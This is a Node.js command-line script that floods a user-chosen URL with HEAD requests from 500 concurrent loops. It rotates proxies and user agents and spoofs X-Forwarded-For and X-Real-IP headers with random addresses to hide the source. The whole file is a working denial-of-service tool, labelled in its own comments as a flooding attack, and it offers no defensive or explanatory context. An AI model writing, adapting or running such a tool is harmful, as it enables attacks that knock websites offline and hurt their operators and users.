const axios = require('axios');
const fs = require('fs');
const clear = require('clear');
const readline = require('readline');
const randomUserAgent = require('random-useragent');

// Load files (user agents, referers, proxies)
function loadFile(filename) {
    try {
        return fs.readFileSync(filename, 'utf-8').split('\n').filter(line => line.trim());
    } catch (e) {
        return [];
    }
}

// Random IP generator for headers
function randomIP() {
    return Array(4).fill().map(() => Math.floor(Math.random() * 256)).join('.');
}

// Load User Agents, Referers, and Proxies
const userAgents = loadFile('ua.txt') || [randomUserAgent.getRandom()];
const referers = loadFile('refs.txt') || ['https://google.com'];
const proxies = loadFile('proxy.txt').concat(loadFile('proxies.txt'));

// Generate random headers
function generateHeaders() {
    return {
        "User-Agent": userAgents[Math.floor(Math.random() * userAgents.length)],
        "Referer": referers[Math.floor(Math.random() * referers.length)],
        "X-Forwarded-For": randomIP(),
        "X-Real-IP": randomIP(),
        "Accept": "*/*",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "en-US,en;q=0.9",
        "Connection": "keep-alive",
        "Cache-Control": "no-cache",
        "Pragma": "no-cache",
        "DNT": "1",
        "Upgrade-Insecure-Requests": "1",
        "Sec-Fetch-Site": "none",
        "Sec-Fetch-Mode": "navigate",
    };
}

// Clear terminal screen
function clearTerminal() {
    clear();
}

// Main Flooding function
async function sendFlood(target, duration, maxThreads) {
    let attempted = 0, success = 0, failed = 0, peakRps = 0;
    const startTime = Date.now();
    
    async function attack() {
        while (Date.now() - startTime < duration * 1000) {
            const headers = generateHeaders();
            const proxy = proxies.length ? proxies[Math.floor(Math.random() * proxies.length)] : null;
            const proxyConfig = proxy ? { http: `http://${proxy}`, https: `http://${proxy}` } : {};

            try {
                let res;
                if (proxy) {
                    res = await axios.head(target, { headers, proxy: proxyConfig, timeout: 3000 });
                } else {
                    res = await axios.head(target, { headers, timeout: 3000 });
                }

                attempted++;
                if (res.status === 200) {
                    success++;
                } else {
                    failed++;
                }
            } catch (e) {
                attempted++;
            }

            // Track peak RPS
            const elapsedTime = (Date.now() - startTime) / 1000;
            const rps = attempted / elapsedTime;
            peakRps = Math.max(peakRps, rps);
        }
    }

    // Dynamically scale threads based on available resources
    const numThreads = maxThreads;

    // Create threads
    const threads = [];
    for (let i = 0; i < numThreads; i++) {
        threads.push(attack());
    }

    await Promise.all(threads);

    const elapsedTime = (Date.now() - startTime) / 1000;
    const timeTaken = Math.min(elapsedTime, 20);  // Force stop if over 20 seconds
    peakRps = Math.round(peakRps);

    return { attempted, success, failed, peakRps, timeTaken };
}

// Running the flood
async function runFlood(target, duration) {
    const { attempted, success, failed, peakRps, timeTaken } = await sendFlood(target, duration, 500);

    clearTerminal();
    console.log(`TOTAL REQUESTS SENT: ${attempted}`);
    console.log(`SUCCES: ${success}`);
    console.log(`FAILED: ${failed}`);
    console.log(`TIME REMAINING: ${Math.max(0, duration - timeTaken)} seconds`);

    clearTerminal();
    console.log(`TOTAL REQUESTS: ${attempted}`);
    console.log(`SUCCES: ${success}`);
    console.log(`FAILED: ${failed}`);
    console.log(`PEAK REQUESTS PER SECOND: ${peakRps}`);
}

// Command line usage
const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout
});

rl.question('Enter target URL and duration (seconds): ', (answer) => {
    const [targetUrl, duration] = answer.split(' ');
    if (!targetUrl || !duration) {
        console.log('Usage: node main.js <target_url> <duration_in_seconds>');
        rl.close();
        return;
    }

    runFlood(targetUrl, parseInt(duration))
        .then(() => rl.close())
        .catch(err => {
            console.error('Error:', err);
            rl.close();
        });
});
